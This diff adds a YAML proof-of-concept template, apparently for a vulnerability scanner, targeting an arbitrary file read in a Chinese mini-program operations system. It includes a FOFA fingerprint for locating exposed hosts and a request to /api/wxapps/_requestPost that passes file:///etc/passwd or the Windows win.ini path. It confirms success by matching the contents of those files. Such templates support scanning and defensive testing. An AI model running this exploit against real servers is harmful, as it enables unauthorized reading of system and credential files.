@@ -1,0 +1,33 @@
+id: poc-yaml-mini-program-operation-system-requestpost-anyfile-read
+info:
+  name: 全行业小程序运营系统 requestPost 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 全行业小程序运营系统
+  fofa: body="/com/css/head_foot.css"
+variables:
+  path: 'etc/passwd
+
+    C:windows/win.ini
+
+    '
+requests:
+- method: GET
+  path: /api/wxapps/_requestPost?url=file:///{{.path}}&data=1
+  expression: '(status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"; for 16-bit app support") && contains(body,"[files]"))
+
+    )
+
+    '
+transport: http
